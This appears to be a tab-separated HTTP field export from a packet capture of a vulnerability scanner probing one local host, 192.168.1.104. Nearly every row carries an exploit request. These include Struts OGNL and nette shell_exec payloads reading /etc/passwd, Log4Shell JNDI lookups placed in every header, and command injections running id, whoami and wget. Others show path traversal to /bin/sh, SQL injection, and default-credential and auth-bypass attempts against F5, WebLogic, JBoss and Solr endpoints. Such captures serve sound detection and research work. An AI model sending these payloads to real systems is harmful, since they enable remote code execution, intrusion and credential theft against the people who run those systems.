http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		288	288	multipart/form-data; boundary=---------------------------154934846911423734231554128137						192.168.1.104															1	http://192.168.1.104/web/clients/editclient.php?id=24s8kEyAZuKiDlcvS30yMhqBAtD&action=update		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/clients/editclient.php?id=24s8kEyAZuKiDlcvS30yMhqBAtD&action=update
*/*	gzip	en															close		51	51							192.168.1.104															1	http://192.168.1.104/web/(download)/tmp/poc.txt		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/(download)/tmp/poc.txt
	gzip																close		73	73	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/SDK/webLanguage		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/SDK/webLanguage
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/CFIDE/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/CFIDE/scripts/ajax/package/cfajax.js
*/*	gzip	en															close		575	575	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/poc.jsp/		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/poc.jsp/
application/json	gzip																close		2829	2829	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104														http://192.168.1.104/web/webadmin/admin/service_manager_data.php	1	http://192.168.1.104/web/webadmin/out		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/webadmin/out
*/*	gzip	en															close		256	256	application/soap;  charset="utf-8"						192.168.1.104															1	http://192.168.1.104/web/_async/AsyncResponseService		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/_async/AsyncResponseService
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/logos_clients/1.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/logos_clients/1.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/x		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/x
	gzip																close		140	140	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ajax/render/widget_tabbedcontainer_tab_panel		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/ajax/render/widget_tabbedcontainer_tab_panel
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cfide/scripts/ajax/package/cfajax.js
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/poc.jsp?cmd=cat+%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
application/json	gzip																close		278	278	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
*/*	gzip	en															close		26	26	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
	gzip																close		243	243	multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo						192.168.1.104															1	http://192.168.1.104/web/page/exportImport/uploadOperation.jsp		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/page/exportImport/uploadOperation.jsp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/CF_SFSD/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/CF_SFSD/scripts/ajax/package/cfajax.js
application/json	gzip																close		183	183	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/nuxeo/login.jsp/pwn$%7B31333333330+7%7D.xhtml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/nuxeo/login.jsp/pwn$%7B31333333330+7%7D.xhtml
*/*	gzip																close		736	736	multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb						192.168.1.104															1	http://192.168.1.104/web/lib/crud/userprocess.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36			PHPSESSID=24s8kHsKbLLLPU3WiFLwQ5KQq6t	/web/lib/crud/userprocess.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/page/exportImport/fileTransfer/poc.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/page/exportImport/fileTransfer/poc.jsp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide-scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/cfide-scripts/ajax/package/cfajax.js
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/cores?wt=json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/solr/admin/cores?wt=json
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getImage.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=png		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/objects/getImage.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=png
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfmx/CFIDE/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/cfmx/CFIDE/scripts/ajax/package/cfajax.js
	gzip																close		1142	1142	application/xml						192.168.1.104															1	http://192.168.1.104/web/webtools/control/SOAPService		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/webtools/control/SOAPService
*/*	gzip	en															close		369	369	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/_search?pretty		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/_search?pretty
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getImageMP4.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/objects/getImageMP4.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1
	gzip																close		82	82	application/octet-stream						192.168.1.104															1	http://192.168.1.104/web/invoker/JMXInvokerServlet/		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/invoker/JMXInvokerServlet/
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/index.php
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getSpiritsFromVideo.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/objects/getSpiritsFromVideo.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg
	gzip																close		82	82	application/octet-stream						192.168.1.104															1	http://192.168.1.104/web/invoker/EJBInvokerServlet/		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/invoker/EJBInvokerServlet/
*/*	gzip	en															close		48	48	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/module/login/login.html	1	http://192.168.1.104/web/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/login
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/nuclei.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/objects/nuclei.txt
*/*	gzip	en															close		579	579	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/user.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/user.action
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lcms/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/lcms/index.php
	gzip	en	admin:						Basic YWRtaW46								close		103	103	application/json						192.168.1.104															1	http://192.168.1.104/web/mgmt/shared/authn/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36			BIGIPAuthCookie=1234	/web/mgmt/shared/authn/login
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/infusions/downloads/downloads.php?cat_id=${system(ls)}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/infusions/downloads/downloads.php?cat_id=${system(ls)}
	gzip	en															close		39	39	application/json						192.168.1.104															1	http://192.168.1.104/web/mgmt/tm/util/bash		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/mgmt/tm/util/bash
	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/cores?wt=json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/solr/admin/cores?wt=json
	gzip																close		32	32							192.168.1.104															1	http://192.168.1.104/web/.%0d./.%0d./.%0d./.%0d./bin/sh		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/.%0d./.%0d./.%0d./.%0d./bin/sh
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C
	gzip																close		21	21	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/system/sharedir.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/system/sharedir.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,	gzip																close		528	528	text/xml;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wls-wsat/RegistrationRequesterPortType		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wls-wsat/RegistrationRequesterPortType
	gzip																close		36	36	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/php/ping.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/php/ping.php
	gzip																close		277	277	application/json						192.168.1.104															1	http://192.168.1.104/web/v2/query		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/v2/query
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://%27);//		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://%27);//
	gzip		admin:password						Basic YWRtaW46cGFzc3dvcmQ=								close		98	98	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boafrm/formSysCmd		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/boafrm/formSysCmd
*/*	gzip																close		47	47							192.168.1.104															1	http://192.168.1.104/web/login.htm		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/login.htm
	gzip																close		46	46	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/upload		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/upload
*/*	gzip	en															close		1005	1005	text/xml						192.168.1.104															1	http://192.168.1.104/web/wls-wsat/CoordinatorPortType		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/wls-wsat/CoordinatorPortType
*/*	gzip																close		74	74	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boardDataWW.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/boardDataWW.php
	gzip																close		143	143	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/
*/*	gzip																close		50	50							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/system_mgr.cgi?		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cgi-bin/system_mgr.cgi?
	gzip																close		22	22	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/login.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/cgi-bin/login.cgi
text/xml	gzip																close		201	201	text/xml						192.168.1.104															1	http://192.168.1.104/web/RPC2		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/RPC2
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36		${jndi:${lower:d}n${lower:s}://${env:hostName}.}		/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		63	63	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/diag_ping_admin_en.asp	1	http://192.168.1.104/web/boaform/admin/formTracert		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/boaform/admin/formTracert
	gzip																close		129	129	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/
	gzip																close		5868	5868	text/xml						192.168.1.104															1	http://192.168.1.104/web/sitecore/shell/ClientBin/Reporting/Report.ashx		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/sitecore/shell/ClientBin/Reporting/Report.ashx
text/plain, */*; q=0.01	gzip, deflate	en-US,en;q=0.5															close		301	301	multipart/form-data; boundary=---------------------------31046105003900160576454225745						192.168.1.104														http://192.168.1.104	1	http://192.168.1.104/web/assets/php/upload.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/assets/php/upload.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/graph_realtime.php?action=init		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36			Cacti=%3Bwget%20http%3A//	/web/graph_realtime.php?action=init
${jndi:ldap://${hostName}.accept.}	${jndi:ldap://${hostName}.acceptencoding.}	${jndi:ldap://${hostName}.acceptlanguage.}															close										192.168.1.104					${jndi:ldap://${hostName}.location.}									${jndi:ldap://${hostName}.referer.}	1	http://192.168.1.104/web/?x=${jndi:ldap://${hostName}./a}		GET				HTTP/1.1																			${jndi:ldap://${hostName}.useragent.}		${jndi:ldap://${hostName}.xforwardedfor.}	${jndi:ldap://${hostName}.cookiename.}=${jndi:ldap://${hostName}.cookievalue.}	/web/?x=${jndi:ldap://${hostName}./a}
	gzip																close		95	95	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/
	gzip																close		245	245	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/
	gzip																close		46	46							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users
